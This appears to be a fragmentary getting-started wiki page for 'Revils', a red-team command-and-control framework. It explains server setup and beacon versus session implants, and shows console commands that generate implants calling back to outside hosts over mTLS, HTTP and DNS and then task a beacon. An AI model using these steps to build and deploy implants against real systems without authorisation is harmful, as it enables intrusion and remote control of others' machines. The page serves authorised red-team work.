...
__⚠️ NOTE:__ This guide is intended for experienced red teamers, but we also have a [Beginner's Guide](https://github.com/BishopFox/revils/wiki/Beginner's-Guide) for a more beginner friendly tutorial.

## Server Setup

The first thing you'll need to do is setup a Revils server, Revils is designed for a one server deployment per-operation.

The server supports Linux, Windows, and MacOS however we strongly recommend running the server on a Linux (or MacOS, well really anything that isn't Windows), as some features may be more difficult to get working on a Windows server. The Windows client should work just fine when accessing a Linux/MacOS server from Windows, if for some odd reason your operators want to actually use Windows you'll just need to setup [multiplayer mode](https://github.com/BishopFox/revils/wiki/Multiplayer-Mode).

Download the latest sever [release](https://github.com/BishopFox/revils/releases) for your platform, and just run the binary. That's it, you're pretty much done.

__IMPORTANT:__ Revils has two external dependancies for _optional_ features: MinGW and Metasploit. To enable DLL payloads you need to install MinGW. To enable some MSF integrations you'll need Metasploit installed on the server.

### MinGW Setup (Optional, Recommended)

In order to enable shellcode/staged/DLL payloads you'll need to install MinGW on the server (clients connecting to the server do not need it installed). By default Revils will look in the usual places for MinGW binaries but you can override this using the [environment variables](https://github.com/BishopFox/revils/wiki/Environment-Variables).
...
__Note:__ On MacOS may have to configure [environment variables](https://github.com/BishopFox/revils/wiki/Environment-Variables) for MinGW.

### Metasploit Setup (Optional)

We strongly recommend using the [nightly framework installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers), Revils expects MSF version 5+.

## Implants Beacon vs. Session

Revils is generally designed as a stage 2 payload, and as such we've not yet endeavored to minimize the implant's file size. Depending on how many protocols you enable in your implant the file can get large, we strongly advise the use of [stagers](https://github.com/BishopFox/revils/wiki/Stagers) for actual operations. Such is the tradeoff for getting easy static compilation in Golang.

Revils implants in v1.5 and later support two modes of operation: "beacon mode" and "session mode." Beacon mode implements an asynchronous communication style where the implant periodically checks in with the server retrieves tasks, executes them, and returns the results. In "session mode" the implant will create an interactive real time session using either a persistent connection or using long polling depending on the underlying C2 protocol. 
...
__IMPORTANT:__ The first time you generate an implant the server needs to download some Go module code, so the server must have internet access. See [offline implant builds](https://github.com/BishopFox/revils/wiki/Offline-Implant-Builds) if this is a problem for you. The modules are cached.
...
```
[server] revils > generate --mtls example.com --save /Users/moloch/Desktop

[*] Generating new windows/amd64 Revils binary
[*] Build completed in 00:00:16
[*] Revils binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
```

#### Beacon Mode

```
[server] revils > generate beacon --mtls example.com --save /Users/moloch/Desktop
...
Revils implants are cross-platform, you can change the compiler target with the `--os` flag. Revils accepts any Golang GOOS and GOARCH as arguments `--os` and `--arch`, we officially only support Windows, MacOS, and Linux, but you can at least attempt to compile for any other [valid Golang GOOS/GOARCH](https://gist.github.com/asukakenji/f15ba7e588ac42795f421b48b8aede63) combination. The `generate info` command will also estimate what compiler targets can be used based on the server's host operating system and available cross-compilers.

Some commands/features may not work on "unsupported" platforms.

```
revils > generate --mtls example.com --save /Users/moloch/Desktop --os mac

[*] Generating new darwin/amd64 Revils binary
[*] Build completed in 00:00:09
[*] Revils binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY
```
...
```
revils > regenerate --save /Users/moloch/Desktop NEW_GRAPE
...
* [HTTP(S) C2](https://github.com/BishopFox/revils/wiki/HTTP(S)-C2)
* [DNS C2](https://github.com/BishopFox/revils/wiki/DNS-C2)
...
If you're having problems getting callbacks please see our [troubleshooting guide](https://github.com/BishopFox/revils/wiki/Troubleshooting#implant-troubleshooting), (TL;DR add the `--debug` flag when generating an implant).
...
[server] revils > use 8c465643-0e65-45f2-bb7e-acb3480de3cb

[*] Active beacon RELATIVE_ADVERTISEMENT (8c465643-0e65-45f2-bb7e-acb3480de3cb)

[server] revils (RELATIVE_ADVERTISEMENT) >
```
...
```
[server] revils (RELATIVE_ADVERTISEMENT) > ls
...
```
[server] revils (RELATIVE_ADVERTISEMENT) > tasks 
...
```
[server] revils (RELATIVE_ADVERTISEMENT) > interactive 
...
You can specify multiple domains and protocols during the generation process. Right now Revils will attempt to use the most performant protocols first (MTLS -> WG -> HTTP(S) -> DNS) using subsequent domains/protocols when connections fail.

```
revils > generate --mtls example.com --http foobar.com --dns 1.lil-peep.rip
```
...
* [Armory](https://github.com/BishopFox/revils/wiki/Armory)
* [Stagers](https://github.com/BishopFox/revils/wiki/Stagers)
* [Port Forwarding](https://github.com/BishopFox/revils/wiki/Port-Forwarding)
* [Reverse SOCKS](https://github.com/BishopFox/revils/wiki/Reverse-SOCKS)
* [BOF/COFF Support](https://github.com/BishopFox/revils/wiki/BOF-&-COFF-Support)
